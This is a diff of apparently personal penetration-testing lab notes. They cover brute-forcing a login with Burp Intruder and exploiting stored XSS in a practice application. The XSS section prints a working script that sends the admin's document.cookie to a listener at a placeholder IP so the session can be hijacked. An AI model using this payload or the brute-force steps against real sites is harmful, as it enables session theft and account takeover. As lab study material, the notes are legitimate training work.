@@ -11,13 +11,13 @@ _(To be performed on your own Kali and Windows 10 lab client machines - Reportin
 - we then must set the correct payload variables and set the attack type to "Pitchforkl"![[Screenshot_2022-06-09-12-23-04_1195x341.png]]
 - Finally, we setup the payloads via the "Grep Extract" section in Intruder, capturing the response ![[Screenshot_2022-06-09-05-26-39_936x779.png]]
 -  Once these steps are complete we can bruteforce the password 
-![[Screenshot_2022-06-09-05-26-09_991x326.png]]
+![[Successful_bruteforce.png]]
 
 
 2.  Insert a new user into the "users" table.
 - Once logged in, creating a user is fairly simple. Start with navigating to the "User Accounts" tab
 - Click the "Create New User" button
-
+![[Screenshot_2022-06-09-05-33-11_1040x688.png]]
 
 # 9.6.6 Practice - XSS
 #### Exercises
@@ -26,8 +26,9 @@ _(To be performed on your own Kali and Windows 10 lab client machines - Reportin
 
 1.  Exploit the XSS vulnerability in the sample application to get the admin cookie and hijack the session. Remember to use the PowerShell script on your Windows 10 lab machine to simulate the admin login.
 - First must craft an XSS that was successfully steal the cookie of an administrator. We will setup a listener on port 80 and use the following snippet:
-- `<script>new Image().src="http://IP.ADDRESS/cool.jpg?output="+document.cookie;</script>`
+ `<script>new Image().src="http://IP.ADDRESS/cool.jpg?output="+document.cookie;</script>`
 -  We then input this into the "Comments" section of the web form.
+![[Screenshot_2022-06-09-05-52-12_527x400.png]]
 - To test the validity of the XSS we then run the powershell script on the Windows machine
 - We can see that the cookie was set to our listener, enabling us to adjust our cookie and hijack the admin's session
 
